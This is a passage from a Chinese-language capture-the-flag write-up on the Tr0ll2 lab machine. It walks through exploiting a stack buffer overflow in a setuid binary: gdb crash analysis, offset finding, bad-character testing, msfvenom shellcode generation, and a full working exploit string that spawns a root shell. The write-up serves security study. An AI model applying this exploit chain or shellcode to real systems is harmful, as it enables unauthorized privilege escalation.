#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

```bash
# Tr0ll
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ gdb -q r00t
# gdb: warning: error finding working directory: No such file or directory
# r00t: No such file or directory.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
# Starting program:  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
# No executable file specified.
# Use the "file" or "exec-file" command.
(gdb) ^Z
# [2]+  Stopped                 gdb -q r00t
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t
# -bash: ./r00t: No such file or directory
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ cd ../
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door2
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
# Good job, stand by, executing root shell...
# ^C
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ cd ../
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door1
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
# Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ gdb -q r00t
# Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
# Starting program: /nothing_to_see_here/choose_wisely/door1/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

# Program received signal SIGSEGV, Segmentation fault.
# 0x6a413969 in ?? ()
```

确定一下偏移量：

```bash
# kali
locate pattern_offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969
# [*] Exact match at offset 268
```

ok，让我们看一下`ALSR`开没开（求求了！！！）

> ASLR（Address Space Layout Randomization）是一种计算机安全技术，旨在增加系统的安全性，特别是在面对缓冲区溢出等攻击时。它通过在每次系统启动时随机化可执行文件的内存布局，以及动态链接库、堆、栈和内存映射等区域的地址，从而增加攻击者在利用系统漏洞时的难度。
>
> 具体来说，ASLR的实现会将可执行文件、共享库、堆、栈等在内存中的布局随机化，使得攻击者难以准确预测内存地址，从而难以成功利用漏洞。这意味着即使攻击者发现了漏洞，也很难编写有效的攻击代码，因为它无法准确地知道要攻击的内存地址。
>
> 0没有开启，1半随机，2全随机（包括heap堆） 作者：沙漠里的鲸 https://www.bilibili.com/read/cv25528221/ 出处：bilibili

```bash
# Tr0ll
cat /proc/sys/kernel/randomize_va_space 
# 0
```

nice！！！没开启。

> 偏移量表示缓冲区起始地址和EBP（扩展基指针）地址之间的距离，以及EBP地址上方的四个字节是EIP（或返回地址）的位置，其大小为四个字节。

写入看一下：

```bash
gdb -q r00t
r $(python -c 'print "A" * 268 + "B" * 4')
info r
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115631.png" alt="image-20240315202319489" style="zoom:50%;" />

`EBP`和`ESI`里面的值确实是`AAAA`和`BBBB`，上面写的`ESP`地址为`0xbffffb60`。

看一下我们要利用的`ESP`地址：

```bash
r $(python -c 'print "A" * 268 + "B" * 4 +"C" * 20')
info registers
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115632.png" alt="image-20240315210329581" style="zoom: 50%;" />

获取ESP内存地址：`0xbffffb40`
即反向ESP为：`\x40\xfb\xff\xbf`。

发现确实是比前面小的，说明可以利用！！

使用 `msfvenom` 创建 `shellcode`，排除以下常见的坏字符

- `\x00`：空字节
- `\x0a`：换行
- `\x0d`：回车

```bash
# kali
msfvenom -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d'
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of py file: 357 bytes
buf =  b""
buf += b"\xbf\xb2\x3d\x76\xf0\xd9\xcb\xd9\x74\x24\xf4\x5d"
buf += b"\x29\xc9\xb1\x0b\x31\x7d\x15\x03\x7d\x15\x83\xed"
buf += b"\xfc\xe2\x47\x57\x7d\xa8\x3e\xfa\xe7\x20\x6d\x98"
buf += b"\x6e\x57\x05\x71\x02\xf0\xd5\xe5\xcb\x62\xbc\x9b"
buf += b"\x9a\x80\x6c\x8c\x95\x46\x90\x4c\x89\x24\xf9\x22"
buf += b"\xfa\xdb\x91\xba\x53\x4f\xe8\x5a\x96\xef"
```

进行利用：

```bash
./r00t $(python -c 'print "A"*268 + "\x40\xfb\xff\xbf" + "\x90"*20 + "\xbf\xb2\x3d\x76\xf0\xd9\xcb\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x7d\x15\x03\x7d\x15\x83\xed\xfc\xe2\x47\x57\x7d\xa8\x3e\xfa\xe7\x20\x6d\x98\x6e\x57\x05\x71\x02\xf0\xd5\xe5\xcb\x62\xbc\x9b\x9a\x80\x6c\x8c\x95\x46\x90\x4c\x89\x24\xf9\x22\xfa\xdb\x91\xba\x53\x4f\xe8\x5a\x96\xef"')
```

执行错误，看来还是得看有哪些坏字符：

#### 确定坏字符

```python
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

该脚本用于生成坏字符：

```text
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

执行语句，查看有哪些坏字符：

```bash
r $(python -c 'print "A"*268 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ')
```

```bash
x/256x $esp   
x/256b $esp
```

去掉`0x09`、`0x0a`、`0x20`、`0x00`:

```bash
msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of c file: 319 bytes
unsigned char buf[] = 
"\xd9\xd0\xd9\x74\x24\xf4\xbb\x19\x0d\x8d\xc3\x5e\x31\xc9"
"\xb1\x0b\x83\xee\xfc\x31\x5e\x16\x03\x5e\x16\xe2\xec\x67"
"\x86\x9b\x97\x2a\xfe\x73\x8a\xa9\x77\x64\xbc\x02\xfb\x03"
"\x3c\x35\xd4\xb1\x55\xab\xa3\xd5\xf7\xdb\xbc\x19\xf7\x1b"
"\x92\x7b\x9e\x75\xc3\x08\x08\x8a\x4c\xbc\x41\x6b\xbf\xc2";
```

```bash
# payload
./r00t $(python -c 'print "A"*268 + "\x40\xfb\xff\xbf" + "\x90"*20 + "\xd9\xd0\xd9\x74\x24\xf4\xbb\x19\x0d\x8d\xc3\x5e\x31\xc9\xb1\x0b\x83\xee\xfc\x31\x5e\x16\x03\x5e\x16\xe2\xec\x67\x86\x9b\x97\x2a\xfe\x73\x8a\xa9\x77\x64\xbc\x02\xfb\x03\x3c\x35\xd4\xb1\x55\xab\xa3\xd5\xf7\xdb\xbc\x19\xf7\x1b\x92\x7b\x9e\x75\xc3\x08\x08\x8a\x4c\xbc\x41\x6b\xbf\xc2"')
```

![image-20240315211451512](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115633.png)

ok，拿下！！！！！

## 参考blog

https://www.freebuf.com/vuls/331990.html

https://blog.csdn.net/qq_34801745/article/details/103859935

https://www.bilibili.com/read/cv25528221/

https://mohamedaezzat.github.io/posts/troll2/